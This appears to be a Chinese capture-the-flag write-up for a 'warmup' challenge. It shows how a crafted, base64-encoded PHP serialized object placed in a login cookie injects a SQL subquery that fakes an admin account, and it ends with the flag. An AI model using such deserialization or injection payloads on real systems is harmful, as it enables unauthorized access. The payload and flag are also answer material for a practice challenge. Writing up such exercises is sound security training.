# 题目名称-warmup

> php反序列化+sq注入

## 涉及函数

### __construct

> 在类实例化的时候,会自动调用该魔术方法,进行类的初始化

### __destruct

> 明确销毁对象或脚本结束时被调用

## SQL 相关

```
select 值1 字段1,值2,字段2
可以生成表
字段1 字段2
值1 值2
```

> 子查询就是将一个查询(子查询)的结果作为另一个查询(主查询)的数据来源或判断条件的查询.常见的子查询有WHERE子查询,HAVING子查询,FROM子查询,SELECT子查询,EXISTS子查询,子查询要使用小括号();

> 

## 分析

> 首页是一个登陆界面,下载源码后分析后得知,直接在登陆处sql注入是不能的了,waf函数过滤了很多字符.得另寻它法.应用在登陆之前会先检查cookie中的last_login_info的值,如果存在会反序列化.说明本道题考查了反序列化漏洞.再根据sql特性,创建账号.

> 先是构造序列化的字符串O:3:“SQL”:4:{s:5:"table";s:41:"(select 'admin' username,'123' password)a";s:8:"username";s:5:"admin";s:8:"password";s:3:"123";s:4:"conn";N;}}

> 然后对它进行base64编码为
TzozOiJTUUwiOjQ6e3M6NToidGFibGUiO3M6NDE6IihzZWxlY3QgJ2FkbWluJyB1c2VybmFtZSwnMTIzJyBwYXNzd29yZClhIjtzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7czo0OiJjb25uIjtOO319

> 将其写入cookie中的last_login_info,用admin/123登陆得到flag

## payload

> TzozOiJTUUwiOjQ6e3M6NToidGFibGUiO3M6NDE6IihzZWxlY3QgJ2FkbWluJyB1c2VybmFtZSwnMTIzJyBwYXNzd29yZClhIjtzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7czo0OiJjb25uIjtOO319

## flag

> cyberpeace{1f1158f00008fb3003b66f5b78f7d44f}

## 参考

> https://mp.weixin.qq.com/s?__biz=MzI3NDc4NTQ0Nw==&mid=2247519666&idx=1&sn=609e9a93b7a8d07d1bf209989c51d976&chksm=eb0c787adc7bf16cc61c716f7fa5f0d356a2d9debde5f8309b4cd1c72703df8baf0dd969b574&scene=27